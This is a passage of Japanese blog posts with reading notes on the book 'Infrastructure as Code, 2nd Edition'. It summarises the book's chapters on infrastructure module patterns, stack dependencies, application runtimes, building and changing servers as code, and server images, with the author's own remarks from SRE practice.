Moduleオブフスケーションモジュールは、実際には価値を追加せず、むしろシステムの複雑さを増加させるものです。このようなモジュールは、コードの可読性を低下させ、保守や拡張を困難にします。開発者がモジュールの背後にあるロジックを理解するのが難しくなり、結果として効率性が損なわれます。Antipattern: Unshared Module共有されていないモジュールは、その再利用性が低く、開発プロセスにおける効率性に欠けます。モジュール化の主な目的は、コードの再利用を促進することにありますが、この目的が達成されていない場合、モジュールの価値は大幅に低下します。このようなモジュールは、システム全体の一貫性を損なう可能性があります。Pattern: Bundle Moduleバンドルモジュールは、関連する複数のリソースを単一のインターフェースで管理することを可能にします。これにより、システムの一貫性と管理の容易さが向上します。特に、異なるリソースが密接に連携して動作する必要がある場合に有効で、開発者はより高度なタスクに集中できるようになります。Antipattern: Spaghetti Moduleスパゲッティモジュールは、パラメータに応じて大きく異なる結果を生み出すような複雑な設定が特徴です。これらのモジュールは、多くの動的な部分を含むため、実装が雑然として理解しにくくなりがちです。このようなモジュールはメンテナンスが困難で、変更を加える際には他の部分に予期せぬ影響を与えやすいことが分かっています。重要なのは、モジュールが単一の明確な目的を持ち、必要な機能だけを提供することです。複雑さを避けるためには、モジュールをより小さく、シンプルに保つことが重要です。Pattern: Infrastructure Domain Entityインフラストラクチャのドメインエンティティは、複数の低レベルのリソースを組み合わせて、より高度なスタックコンポーネントを実装するパターンです。このパターンは、特定のアプリケーションやサービスに必要なインフラストラクチャの全体像を捉え、その要件に基づいてリソースを動的に構築します。このアプローチは特に大規模で複雑な環境において効果的で、異なる要件に応じて柔軟にインフラストラクチャを構築できるようにします。しかし、これを実装するには、インフラストラクチャ自体をドメインとして捉え、その上で適切な設計を行う必要があります。Building an Abstraction Layer抽象化レイヤーを構築することで、より低レベルのリソースへの直接的なアクセスを抽象化し、より高レベルのタスクに集中できるようにします。これは、特に複数のチームが関わる大規模なプロジェクトにおいて有用です。抽象化レイヤーを使用することで、開発者はインフラストラクチャの詳細を気にせずに、アプリケーションの開発やビジネスロジックに集中できます。しかし、抽象化には適度なレベルが必要であり、過度な抽象化はシステムの理解を難しくし、問題の診断や解決を複雑化することもあります。第16章では、コンポーネントからスタックを構築する方法とその利点について説明されていますが、同時に、抽象化のレイヤーやコンポーネントのライブラリがもたらす複雑さに注意する必要があるとも指摘しています。システムの規模や複雑さに応じて、これらの構造を適切に使用することが重要です。適切な抽象化レベルの選択は、システムの効率をあげることにつながります。17. Using Stacks As Components (スタックをコンポーネントとして使用する)17. Using Stacks As ComponentsDiscovering Dependencies Across Stacksスタック間の依存関係の発見は、インフラストラクチャの複雑な環境において、異なるスタック間の統合を容易にするために重要です。依存関係を発見する方法を選ぶ際には、システムの拡張性、メンテナンスの容易さ、そして再利用性のバランスを考慮することが必要です。スタック間の依存関係を効果的に管理することは、システム全体の効率を向上させることに繋がります。Pattern: Resource Matchingリソースマッチングパターンは、名前、タグ、または他の識別特性を使用して、必要なリソースを発見する方法です。このパターンは、特に大規模なプロジェクトや、異なるチームや環境間での統合において有効です。実際、私が過去に関わったプロジェクトでは、リソースマッチングを使用することで、複数の環境やチーム間でのリソースの共有が容易になりました。Figure 17-1. Resource matching for discovering dependencies より引用Pattern: Stack Data Lookupスタックデータルックアップパターンは、提供側スタックが管理するデータ構造に基づいて、必要なリソースを見つける方法です。このアプローチは、全てのインフラストラクチャが同じツールを使用して管理されている場合に特に効果的です。スタックデータルックアップは、依存関係を明確にし、統合を容易にするために役立ちます。Pattern: Integration Registry Lookup統合レジストリルックアップパターンは、両方のスタックが一つのレジストリを使用して値を保存し、それを読み取る方法です。これは、異なるツールを使用している複数のチーム間の統合に非常に適しています。私自身も、異なる技術スタックを持つチーム間での統合にこのパターンを利用したことがあり、その柔軟性と効率性に非常に満足しています。Dependency Injection依存性の注入は、スタック定義から依存性の発見を分離することで、スタックの再利用性と柔軟性を向上させるテクニックです。このアプローチにより、異なるプロバイダー実装を容易に切り替えることが可能になり、より包括的に統合されたシステムのテストが容易になります。依存性の注入を使用することで、スタックをよりモジュラー化し、システムの各部分を独立して開発し、テストすることが可能になります。スタックをコンポーネントとして使用することは、システムの変更を容易にし、品質を向上させる効果的な方法です。このアプローチの成功は、スタックを適切に設計し、サイズを適切に保ち、スタック間の緩い結合を維持することに依存しています。スタックをコンポーネントとしてうまく利用することで、システム全体の可用性と拡張性が大幅に向上し、チームの生産性が向上しました。まとめインフラストラクチャをコードとして扱う際のベストプラクティス、効果的な設計パターン、および一般的なアンチパターンに焦点を当てています。この部分は、インフラストラクチャのモジュラリティの重要性を強調し、スタックのデザインパターンとアンチパターンを紹介します。依存関係の管理に関する方法論や依存性の注入の利点も説明されており、全体として、インフラストラクチャを効果的に設計し、管理するための重要な原則と方法論を提供しています。これらのガイドラインは、インフラストラクチャをコードとして扱う際に直面する一般的な課題に対する解決策を提示し、システムの効率性、拡張性、および信頼性を高めるための具体的な指針を提供しています。Infrastructure as Code, 2nd Editionの読書感想文Infrastructure as Code, 2nd Edition の I. Foundations 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のII. Working With Infrastructure Stacks 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition の III. Working With Servers And Other Application Runtime Platforms 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のIV. Designing Infrastructure 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のV. Delivering Infrastructure 読書感想文 - じゃあ、おうちで学べる","link":"https://syu-m-5151.hatenablog.com/entry/2023/11/16/143554","isoDate":"2023-11-16T05:35:54.000Z","dateMiliSeconds":1700112954000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Infrastructure as Code, 2nd Edition の III. Working With Servers And Other Application Runtime Platforms 読書感想文","contentSnippet":"はじめに前回の続きで第二部のIII. Working With Servers And Other Application Runtime Platforms (サーバーおよびその他のアプリケーションランタイムプラットフォームとの作業)という部の読書感想文になります。前回の記事syu-m-5151.hatenablog.com 次回の記事syu-m-5151.hatenablog.com書籍のリンクInfrastructure as Code: Dynamic Systems for the Cloud Age (English Edition)作者:Morris, KiefO\'Reilly MediaAmazon第三部 目次III. Working With Servers And Other Application Runtime Platforms (サーバーおよびその他のアプリケーションランタイムプラットフォームとの作業)10. Application Runtimes (アプリケーションランタイム)    - アプリケーションの実行環境に関する概要と管理方法を提供します。11. Building Servers As Code (サーバーをコードとして構築する)    - コードを使用してサーバーを構築する方法について詳しく説明します。12. Managing Changes To Servers (サーバーへの変更の管理)    - サーバーに加えられる変更を効果的に管理する戦略を提供します。13. Server Images As Code (サーバーイメージをコードとして)    - サーバーイメージをコード化するアプローチとその利点について解説します。14. Building Clusters As Code (クラスターをコードとして構築する)    - クラスターを効率的にコードで構築する手法について紹介します。III. Working With Servers And Other Application Runtime Platforms (サーバーおよびその他のアプリケーションランタイムプラットフォームとの作業)10. Application Runtimes(アプリケーションランタイム)アプリケーションランタイムの章では、システムの3層モデルの一部として「インフラストラクチャシステムの部品」でアプリケーションランタイムを導入しています。ここでは、インフラ層からリソースを組み合わせて、アプリケーションをデプロイできるランタイムプラットフォームを提供する方法に焦点を当てています。アプリケーションランタイムは、インフラ管理ツールを使用して定義および作成されたインフラストラクチャスタックで構成されています。これは、どの言語や実行スタックで実行されるか、サーバー、コンテナ、またはFaaSサーバーレスコードにパッケージ化してデプロイされるかなど、それを使用するアプリケーションの理解から始まります。本章は、アプリケーションに対するランタイムプラットフォームとしてのインフラリソースの構成方法に焦点を当て、後の章でこれらのリソースをコードとして定義および管理する方法について詳しく説明しています。Figure 10-1. The application layer composed of infrastructure stacks より引用Cloud Native and Application-Driven Infrastructureクラウドネイティブとアプリケーション主導のインフラに関するこのセクションは、現代インフラのダイナミックな性質を最大限に活用するソフトウェア設計に重点を置いています。Herokuの12ファクターメソドロジーやKubernetesエコシステムとの関連性は、現代のアプリケーション開発の重要性を強調しています。このアプローチは、特に大規模なシステムの再構築や運用において、私の経験と一致しています。クラウドネイティブは、可変性と拡張性を重視したアプローチであり、これが現代のソフトウェア開発の標準となっています。Application Runtime Targetsアプリケーションランタイムターゲットを選定する際には、アプリケーションポートフォリオのランタイム要件を分析し、それに合わせたランタイムソリューションを設計することが重要です。これは、特に異なる技術スタックを持つ複数のプロジェクトを管理する場合に非常に役立ちます。ランタイムターゲットの選択は、アプリケーションのパフォーマンスと効率に大きく影響します。例えば、サーバーレス環境やコンテナベースの環境では、従来のサーバーベースのランタイムとは異なるアプローチが必要です。Deployable Parts of an Applicationアプリケーションのデプロイ可能な部分を理解することは、効率的なアプリケーションデプロイメント戦略を策定する上で重要です。実行可能ファイル、サーバー設定、データ構造などを適切に管理することは、私の経験上、運用の効率化に直結します。デプロイメントの自動化は、特に大規模なアプリケーションにおいて、時間とリソースの節約につながります。Deployment Packagesデプロイメントパッケージのセクションは、異なるランタイム環境に適したパッケージ形式の理解を深めます。これは、適切なツールとプロセスを選択する上でのガイドとなります。デプロイメントパッケージは、アプリケーションの構成とデプロイメントを標準化し、異なる環境間での一貫性を保証します。Deploying Applications to Serversサーバーへのアプリケーションデプロイメントに関しては、物理的または仮想的なサーバーを利用する従来のアプローチに焦点を当てています。これは、インフラの柔軟性とアプリケーションのニーズのバランスをとる上で重要な考慮点です。サーバーベースのデプロイメントは、特にレガシーシステムや特定のセキュリティ要件を持つアプリケーションにおいて、依然として重要な役割を果たします。Packaging Applications in Containersコンテナでのアプリケーションパッケージングについては、依存関係をアプリケーションパッケージに取り込むことの利点と課題を詳述しています。コンテナ化の進展は、アプリケーションのデプロイメントと運用の柔軟性を大きく向上させています。コンテナは、異なる環境間でのアプリケーションの実行を標準化し、デプロイメントプロセスを単純化します。Deploying Applications to Server Clustersサーバークラスターへのアプリケーションデプロイメントは、スケーラビリティと冗長性を確保するための重要な手法です。私の経験でも、効果的なクラスターマネジメントはシステムの可用性を大幅に向上させることができます。サーバークラスターは、負荷分散や障害耐性の向上に寄与します。Deploying Applications to Application Clustersアプリケーションクラスターへのデプロイメントは、ホストサーバー間でのアプリケーションインスタンスの分散に注目しています。これは、特に大規模なアプリケーションにおいて、リソースの効率的な利用とスケーラビリティの向上を実現します。クラスター内の異なるサーバーで異なるアプリケーションを実行することにより、リソースの最適化と柔軟な運用が可能になります。Packages for Deploying Applications to Clustersクラスターへのアプリケーションデプロイメントに必要なパッケージに関するセクションでは、複雑なインフラストラクチャ上で複数のプロセスとコンポーネントをデプロイする方法について説明しています。このアプローチは、現代の大規模アプリケーションの運用に不可欠です。クラスターベースのデプロイメントは、アプリケーションのスケールアップとスケールダウンを効率的に管理するための鍵となります。Deploying FaaS Serverless ApplicationsFaaS（Function as a Service）サーバーレスアプリケーションのデプロイメントは、サーバーやコンテナの詳細を抽象化し、インフラの複雑さから開発者を解放します。これは、迅速な開発とデプロイメントを可能にし、特にイベント駆動型アプリケーションやマイクロサービスアーキテクチャに適しています。サーバーレスは、リソースの使用に基づいた課金モデルを提供し、コスト効率を向上させます。Application Dataアプリケーションデータに関して、特にデータ構造の変更やデータの継続性の確保の重要性に焦点を当てています。これは、データベースの設計と運用における私の経験と一致し、データの変更と管理がシステムの信頼性と拡張性に大きく寄与することを示しています。Data Schemas and Structuresデータスキーマと構造のセクションでは、構造化されたデータストレージと非構造化、またはスキーマレスなデータストレージの違いを説明しています。スキーマ移行ツールの使用は、私の経験では、データベースのバージョン管理と変更の追跡に非常に有効であることが分かりました。Cloud Native Application Storage Infrastructureクラウドネイティブアプリケーションストレージインフラストラクチャは、動的に割り当てられるストレージリソースに重点を置いています。これは、拡張性とリソースの最適化におけるクラウドネイティブのアプローチの利点を反映しています。Application Connectivityアプリケーションの接続性に関するセクションでは、インバウンドとアウトバウンドの接続要件と、これらをインフラストラクチャスタックの一部として定義する方法について説明しています。これは、ネットワーク設計とセキュリティを考慮したアプリケーション開発に不可欠な要素です。Service Discoveryサービスディスカバリーに関しては、動的なインフラストラクチャでのサービスの発見方法として、DNS、リソースタグ、構成レジストリなどを含む様々なメカニズムに焦点を当てています。これは、マイクロサービスアーキテクチャや大規模な分散システムにおいて、サービス間の連携と通信のための重要な概念です。最後に、この章の結論では、インフラストラクチャの目的は有用なアプリケーションとサービスを実行することであると強調しています。アプリケーション主導のインフラストラクチャアプローチは、アプリケーションのランタイム要件に焦点を当て、アプリケーションの実行に必要なスタック、サーバー、クラスターなどの中間層構造を設計するのに役立ちます。「アプリケーション主導のインフラストラクチャ戦略では、現代的な動的インフラを使用してアプリケーションランタイム環境を構築します。(原文: An application-driven infrastructure strategy involves building application runtime environments for applications using modern, dynamic infrastructure.)」は、現代のインフラストラクチャ設計の核心をついており、私自身の経験でも、動的で柔軟なインフラストラクチャの設計と実装が、効率的で拡張性のあるシステムの構築に不可欠であることを強く感じています。アプリケーションのニーズに応じてインフラを適応させることが、現代のソフトウェア開発と運用の鍵となっています。11. Building Servers As Code (サーバーをコードとして構築する)「サーバーをコードとして構築する」章では、サーバーの設定を自動化する方法としてインフラストラクチャとしてのコードが最初に登場したことについて説明しています。システム管理者は、シェル、バッチ、Perlスクリプトを書いてサーバーを設定し、CFEngineはサーバー上のパッケージのインストールと設定ファイルの管理に対して、宣言型で冪等なDSLの使用を先駆けました。そして、PuppetやChefがこれに続きました。これらのツールは、物理サーバーやVMwareを使用した仮想マシン、後にはクラウドインスタンスなど、既存のサーバーから始めることを前提としています。現在では、サーバーがインフラスタックの一部であるか、コンテナクラスターの下層の詳細であるかに焦点を当てています。しかし、サーバーはほとんどのアプリケーションランタイム環境において依然として不可欠な部分です。この章では、サーバーの構成内容（設定する必要があるもの）とサーバーのライフサイクル（設定活動が行われるタイミング）から始まり、サーバー設定コードとツールに関する視点に移ります。この章の中心的な内容は、サーバーインスタンスの作成方法、サーバーを事前に構築して複数の一貫性のあるインスタンスを作成する方法、およびサーバーライフサイクル全体にわたるサーバー設定の適用方法に関する異なる方法を見ています。サーバーのライフサイクルをいくつかの遷移フェーズに分けて考えることが役立つ場合があります。サーバーの基本的なライフサイクルには、サーバーインスタンスの作成と設定、既存のサーバーインスタンスの変更、サーバーインスタンスの破棄という3つの遷移フェーズがあります。Figure 11-1. The basic server life cycle より引用What’s on a Serverサーバーに存在するものを理解することは、システムの安定性と効率を高める上で重要です。サーバー上のソフトウェア、設定、データの区別は、特に自動化されたインフラ管理において、適切なツールの選択と利用に不可欠です。私の経験からも、これらの要素を適切に管理することがシステムの安定稼働に直接影響を与えます。Where Things Come Fromサーバーの要素がどこから来るかを理解することは、サーバー構築と運用の複雑さを浮き彫りにします。OSのインストール、OSパッケージリポジトリ、言語やフレームワークのパッケージなど、多様な要素の組み合わせがサーバーのセットアップにおいて重要です。私の経験では、これらの要素を適切に組み合わせることが、効率的で堅牢なサーバーインフラの構築に不可欠であることが明らかです。Server Configuration Codeサーバー設定コードのセクションは、自動化されたサーバー設定のためのツールとアプローチを詳述しています。Ansible、Chef、Puppetなどのツールは、サーバー設定の自動化において非常に重要な役割を果たし、私の経験からもこれらのツールの有効性を実感しています。Server Configuration Code Modulesサーバー設定コードモジュールについてのこの部分は、コードの組織化とモジュール化の重要性を強調しています。実際のプロジェクトでは、これらの原則がサーバー設定の複雑さを管理するために不可欠です。コードのモジュール化は、メンテナンスの容易さと拡張性を提供します。Designing Server Configuration Code Modulesサーバー設定コードモジュールの設計についてのセクションは、単一の関心事に焦点を当てたモジュールの重要性を説明しています。これは、効率的なインフラストラクチャ管理に必要なベストプラクティスです。私の経験でも、関心の分離を行うことで、より管理しやすく、エラーの少ないインフラを構築できることが実証されています。Versioning and Promoting Server Codeサーバーコードのバージョニングと昇格に関するこの部分は、サーバー設定の変更を管理するための戦略を提供します。コードのバージョン管理は、安定したインフラストラクチャ環境の維持において重要です。バージョン管理を通じて、安定性と再現性を保証することができます。Server Rolesサーバーの役割に関するセクションは、特定の設定モジュール群をサーバーに適用する方法を示しています。これは、サーバー設定の柔軟性と適用性を高めるための有効な手法です。役割に基づくモジュール管理は、特に大規模な環境において、サーバーの設定と運用を簡素化します。Testing Server Codeサーバーコードのテストに関するこの部分は、インフラストラクチャコードのテスト戦略を提供し、品質保証において重要な役割を果たします。私の経験では、テストはインフラストラクチャの信頼性と整合性を保証するための鍵です。Progressively Testing Server Codeサーバーコードの段階的なテストについてのセクションは、テスト戦略を効果的に組み立てる方法を示しています。これは、インフラストラクチャの信頼性を高めるために不可欠です。段階的なテストは、コードの整合性を保ちながら、継続的に品質を向上させることができます。What to Test with Server Codeサーバーコードで何をテストするかについてのこのセクションは、テストの焦点と目的を明確にします。これは、サーバー設定の精度と効率を保証するために重要です。テストを通じて、異なる環境や条件下でのサーバーの挙動を確認し、予期せぬ問題の早期発見と修正を行うことができます。How to Test Server Codeサーバーコードをどのようにテストするかに関するセクションは、効果的なテスト方法とツールを提供します。InspecやServerspecなどのツールは、サーバーの状態を検証し、期待される動作を保証するために役立ちます。実際のテストプロセスは、特定の条件下でサーバーの設定と動作を確認し、必要に応じて調整を行うことを目的としています。Creating a New Server Instance新しいサーバーインスタンスを作成する際には、物理サーバーや仮想マシンの選択、OSのインストール、初期設定の適用が含まれます。これは、効率的で再現性の高いサーバー環境を構築するために重要です。私の経験では、新しいサーバーインスタンスの作成は、システムの拡張性と柔軟性に大きく寄与します。Hand-Building a New Server Instance手作業で新しいサーバーインスタンスを構築する方法は、特に小規模な環境や実験的な目的に適しています。しかし、大規模な運用環境においては、この方法は非効率的でエラーが発生しやすいため、自動化されたプロセスに置き換えることが望ましいです。Using a Script to Create a Serverサーバー作成のためのスクリプト使用に関して、このセクションはサーバー作成プロセスの自動化の重要性を強調しています。コマンドラインツールやAPIを利用するスクリプトを作成することで、サーバーの設定が一貫性を持ち、透明性が向上します。私の経験では、このようなスクリプトを活用することで、サーバーのデプロイメントプロセスの効率化とエラーの削減が可能です。Using a Stack Management Tool to Create a Serverスタック管理ツールを使用したサーバー作成に関するこの部分では、サーバーを他のインフラリソースと一緒に定義する利点を説明しています。Terraformなどのツールを使用することで、サーバーインスタンスの作成や更新が簡素化されます。私の経験上、スタックツールの使用は、インフラリソースの統合と管理を効率的に行うのに役立ちます。Configuring the Platform to Automatically Create Serversプラットフォームを設定して自動的にサーバーを作成するこのセクションは、オートスケーリングやオートリカバリーのような機能を利用する方法を示しています。これは、負荷の増加に応じたサーバーの追加や障害発生時のサーバーインスタンスの交換といった、動的な環境において特に重要です。Using a Networked Provisioning Tool to Build a Serverネットワークプロビジョニングツールを使用してサーバーを構築するこの部分では、ハードウェアサーバーの動的なプロビジョニングプロセスについて説明しています。PXEブートなどの手法を利用して物理サーバーをリモートで起動し、OSインストールや設定を行うプロセスは、特に物理的なインフラを管理する際に有効です。Prebuilding Servers事前にサーバーを構築するこのセクションでは、サーバーの内容を事前に準備する複数の方法を提供しています。これにより、サーバーの構築プロセスを高速化し、複数の一貫性のあるサーバーインスタンスを容易に作成できます。実際に、事前に構築されたサーバーイメージを使用することで、デプロイメントの時間と労力を大幅に削減できることを経験しています。Hot-Cloning a Server実行中のサーバーをホットクローニングするこの部分では、クローニングを行う際の利便性とリスクについて説明しています。特に、本番環境のサーバーをクローニングする際には、意図しない影響を避けるために注意が必要です。Using a Server Snapshotサーバースナップショットの使用に関するこのセクションでは、ライブサーバーからスナップショットを取得し、そのスナップショットを使用して新しいサーバーを作成する方法を提供しています。これは、特に大規模な環境において、サーバーの一貫性を保つための有効な方法です。Creating a Clean Server Imageクリーンなサーバーイメージを作成するこの部分では、複数の一貫性のあるサーバーインスタンスを作成するための基盤となるイメージを作成するプロセスを説明しています。これは、サーバーのデプロイメントを標準化し、品質を保つために非常に重要です。Configuring a New Server Instance新しいサーバーインスタンスの設定に関するこのセクションでは、サーバーの作成とプロビジョニングプロセスの最後の部分である自動化されたサーバー設定コードの適用について説明しています。このプロセスは、新しいサーバーを作成する際の構成を決定する上で重要な要素です。最後に、この章はサーバーの作成とプロビジョニングに関する様々な側面をカバーしています。サーバーに含まれる要素にはソフトウェア、設定、データがあり、これらは通常、サーバーイメージとサーバー設定ツールを使用して追加されるパッケージと設定から構成されます。サーバーを作成するためには、コマンドラインツールを使用するかUIを使用することができますが、コード駆動のプロセスを使用することが好ましいです。今日では、カスタムスクリプトを作成することは少なく、スタック管理ツールを使用することが一般的です。サーバーを構築するためのさまざまなアプローチについて説明していますが、通常、サーバーイメージを構築することをお勧めします。12. Managing Changes To Servers (サーバーへの変更の管理)この章は、サーバーとそのインフラに対する変更を管理するための多様なアプローチとパターンを探求しています。この章を読んで、サーバーの変更管理における自動化の重要性が強く印象に残りました。特に、変更を例外的なイベントではなく、日常的なルーチンとして取り扱うことの重要性が強調されている点に共感しました。私自身の経験からも、一貫性のある自動化された変更プロセスは、システムの安定性と信頼性を大きく向上させると確信しています。また、この章で提案されている様々なパターン、特に「継続的な設定同期」と「不変のサーバー」というパターンは、サーバー運用の効率を高める上で非常に有効です。サーバーの設定を定期的に同期することで、予期せぬ変更や誤差を早期に検出し、対処することが可能になります。また、不変のサーバーの概念は、変更によるリスクを減らす効果的な手法として、私のプロジェクトでも積極的に採用しています。サーバー設定コードをどのように適用するかに関しても、プッシュとプルの2つのパターンを詳しく説明しています。これらのパターンの選択は、サーバーのライフサイクルイベントに合わせて行う必要があり、特定の状況や要件に基づいて適切なアプローチを選択することが重要です。サーバーの他のライフサイクルイベント、例えばサーバーインスタンスの停止、再起動、置換、失敗したサーバーの回復などについても、有益な洞察を提供しています。特に、サーバーの回復プロセスは、クラウドインフラストラクチャの信頼性の限界に対処するために不可欠です。総じて、サーバーのライフサイクル管理における現代的なアプローチを包括的に提示しており、サーバーの設定と変更プロセスを最適化するための貴重なリソースとなっています。Change Management Patterns: When to Apply Changesサーバーの変更管理パターンは、変更を適用するタイミングを決定するための重要なガイドラインを提供します。変更が必要となった場合にそれを例外的なイベントとして扱うのではなく、ルーチンとして組み込むことで、システムの一貫性とポリシーへの準拠を確保できます。これは、私が経験したシステムの自動化における重要な一歩です。Antipattern: Apply On Changeこのアンチパターンは、特定の変更を適用するためにのみ設定コードを使用することを示しています。変更を例外として扱うことは、システムの不整合とエラーの原因となることが多いです。これは、私の経験でも、効率的なシステム管理において避けるべき方法です。Pattern: Continuous Configuration Synchronization継続的な設定同期は、変更があるかどうかに関わらず、定期的に設定コードを適用することを意味します。これにより、サーバーの設定の一貫性が保たれ、予期せぬ違いを早期に検出できます。これは、私のSREとしての実践において、サーバー運用の効率を大幅に向上させた方法です。Pattern: Immutable Server不変のサーバーとは、設定が変更されないサーバーインスタンスを意味します。変更を配信するために、変更された設定で新しいサーバーインスタンスを作成し、既存のサーバーを置き換えます。これは、特に安定性と整合性が重要な環境で有効な手法です。How to Apply Server Configuration Codeサーバー設定コードの適用方法に関するこのセクションは、サーバーに変更を適用するためのパターンを検討します。サーバーの新規構築、既存インスタンスの更新、サーバーイメージの構築において、これらのパターンは不可欠です。Pattern: Push Server Configurationプッシュサーバー設定パターンでは、新しいサーバーインスタンスの外部からサーバーに接続してコードを実行し、適用します。これは、サーバーインスタンスへのタイムリーな設定更新が必要な場合に特に有効です。Pattern: Pull Server Configurationプルサーバー設定パターンでは、サーバーインスタンス自体で実行されるプロセスが設定コードをダウンロードして適用します。これは、サーバーインスタンスが入ってくる接続を受け入れる必要がないため、攻撃面を減らすのに役立ちます。Other Server Life Cycle Eventsサーバーの他のライフサイクルイベントに関するこのセクションでは、サーバーインスタンスの停止、再起動、置換、失敗したサーバーの回復などを検討します。これらは、サーバーの管理と運用において、特に重要なフェーズです。Stopping and Restarting a Server Instanceサーバーインスタンスの停止と再起動に関するこのセクションは、特定の目的のためにサーバーを一時的に停止または再起動する方法を示しています。これは、コスト削減やメンテナンスのために、しばしば実践されます。Figure 12-1. Server life cycle—stopping and restarting より引用Replacing a Server Instanceサーバーインスタンスの置換に関するこの部分は、新しいサーバーインスタンスを作成し、古いインスタンスと交換するプロセスを説明しています。これは、特に自動スケーリングや自動回復を利用する環境で役立つアプローチです。Recovering a Failed Server失敗したサーバーの回復についてのこのセクションでは、サーバーインスタンスが失敗した場合の回復プロセスについて説明しています。これは、クラウドインフラストラクチャの信頼性が常に保証されるわけではないため、特に重要です。この章は、サーバーのライフサイクルにおける核心的なイベントを網羅しています。サーバーの作成と変更に関するアプローチの多くは、サーバーイメージをカスタマイズし、それを使用して複数のサーバーインスタンスを作成または更新することに依存しています。13. Server Images As Code (サーバーイメージをコードとして扱う)サーバーイメージの自動化された構築と維持に関する包括的なガイドを提供しています。この章を読む中で、サーバーイメージの構築と管理を自動化することの重要性が強調されてました。特に、サーバーイメージのライフサイクルを通じて、一貫性と品質の確保に焦点を当てることが重要であると感じました。サーバーイメージの構築プロセスは、オンラインとオフラインの二つのアプローチが存在し、各々の利点と制約について詳しく解説されています。私の経験上、オフラインのイメージ構築は迅速で、特定のシナリオでは非常に有効ですが、より複雑な設定を必要とすることがあります。また、サーバーイメージの異なる起源、例えばベンダー提供のストックイメージやゼロからの構築、そしてそのコンテンツの出所に関する議論は、セキュリティとパフォーマンスのバランスを取る上で非常に有益です。セキュリティに関する考慮事項は、特に重要であり、サーバーイメージの構築プロセスにおいて常に優先されるべきです。サーバーイメージのバージョニングと更新の管理は、章の中でも特に興味深い部分でした。これにより、サーバーイメージが最新のセキュリティパッチや設定で常に最新の状態を保つための効率的な方法が提供されます。私の経験では、サーバーイメージの定期的な更新は、インフラの安定性と運用の効率を大幅に向上させることができます。さらに、サーバーイメージをパイプラインを通じてテストおよび配信することに関するセクションは、インフラストラクチャの自動化とCI/CDの実践において非常に重要な概念を提供します。パイプラインを使用することで、サーバーイメージの構築、テスト、配布が容易かつ効率的になります。この章全体を通して、サーバーイメージを効率的に管理し、継続的に改善するための強固な基盤が提示されています。これは、現代のインフラストラクチャ管理において不可欠なリソースであり、その実践は技術的な洞察とともに、ビジネスの効率性とセキュリティを高める重要な手段となります。Figure 13-1. Server image life cycle より引用Building a Server Imageサーバーイメージの構築に関するセクションでは、カスタムサーバーイメージの作成プロセスの重要性とその利点について深く掘り下げられています。このプロセスを通じて、組織固有の要件やセキュリティ基準に合致したイメージを作成することの価値が明らかにされました。このセクションは、自動化されたイメージ作成のアプローチが、サーバーのデプロイメントをより迅速かつ安全にする方法を示しています。実際に、カスタマイズされたイメージを使用することで、セキュリティやパフォーマンスの最適化が可能になると私は経験しています。Why Build a Server Image?サーバーイメージを構築する理由についてのセクションは、特に啓発的でした。組織のガバナンス、セキュリティの強化、パフォーマンスの最適化など、カスタムイメージを構築するための具体的な理由が挙げられています。これらの要因は、私が直面する日常の課題と密接に関連しており、カスタムサーバーイメージを活用することの価値を再確認させてくれました。How to Build a Server Imageサーバーイメージの構築方法に関する部分は、理論的かつ実践的なアプローチを提供しており、非常に役立ちました。オンラインとオフラインの両方のイメージ構築方法が詳細に説明されており、これは技術的な選択肢を検討する際に重要なガイドラインとなります。Tools for Building Server Imagesこのセクションでは、サーバーイメージを構築するためのツールとサービスが詳述されています。Packerのようなツールの利用が、イメージ構築プロセスを効率化する上でいかに重要かが強調されているのを見て、私の現在のワークフローに対する洞察を得ることができました。Online Image Building Processオンラインでのイメージ構築プロセスについてのセクションは、イメージを作成する実際の手順を明確に説明しています。このプロセスに関する詳細な説明は、実務での応用を容易にし、サーバーイメージの構築方法の理解を深めました。Offline Image Building Processオフラインイメージ構築プロセスに関する説明は、オンラインプロセスとの比較を通じて、異なるアプローチの利点と制約を理解するのに役立ちました。オフラインでのイメージ構築方法は、特定の状況下での効率性を考慮する上で重要です。Origin Content for a Server Imageサーバーイメージの起源コンテンツに関するセクションは、イメージ構築の基礎となる要素についての理解を深めるのに役立ちました。ストックイメージからの構築、スクラッチからの構築、そしてサーバーイメージとそのコンテンツの由来に関する議論は、イメージ構築プロセスの基礎を形成します。Building from a Stock Server Imageストックサーバーイメージからの構築に関するセクションは、既存のイメージをカスタマイズする方法とその利点を解説しています。このアプローチは、特にセキュリティやパフォーマンスの最適化を目指す際に重要です。Building a Server Image from Scratchゼロからサーバーイメージを構築するプロセスに関する詳細は、完全にカスタマイズされたイメージを作成するための重要なガイドラインを提供しています。これは、特定の高度な要件を持つ組織にとって特に有益です。Provenance of a Server Image and its Contentサーバーイメージとそのコンテンツの出所に関するセクションは、セキュリティと信頼性の側面を考慮する上で特に重要です。サードパーティからのコンテンツを使用する際の潜在的なリスクを理解し、適切なチェックを実施することが強調されています。Changing a Server Imageサーバーイメージの変更に関するセクションは、イメージの維持と更新のプロセスに光を当てています。定期的なリフレッシュとバージョニングの重要性に関する洞察は、効率的で安全なインフラストラクチャ管理のために不可欠です。Reheating or Baking a Fresh Imageイメージの再加熱または新たなイメージの焼き直しに関するセクションは、サーバーイメージの更新方法に関する具体的な選択肢を提示しています。どちらのアプローチもそれぞれのメリットがあり、状況に応じて適切な方法を選択することが重要です。Versioning a Server Imageサーバーイメージのバージョニングに関する議論は、イメージの追跡と管理の重要性を強調しています。バージョニングは、イメージの透明性と一貫性を保つ上で不可欠な要素です。Updating Server Instances When an Image Changesイメージが変更された場合のサーバーインスタンスの更新についてのセクションは、イメージを基に作成されたインスタンスの一貫Updating Server Instances When an Image Changes「イメージが変更されたときのサーバーインスタンスの更新」に関するセクションは、サーバーイメージの更新とサーバーインスタンスの同期に関する洞察を提供しました。この部分では、新しいサーバーイメージを作成した後のサーバーインスタンスの管理方法について考察しています。サーバーインスタンスを即座に更新するか、自然に時間が経過するまで待つかという選択は、システムの整合性と運用の効率の両方に影響を及ぼします。私の経験では、定期的なサーバーインスタンスの更新は、セキュリティとパフォーマンスの観点から重要です。また、適切なバージョン管理と更新ポリシーは、サーバー環境の一貫性を保ち、予期せぬ問題を回避するために不可欠です。Providing and Using a Server Image Across 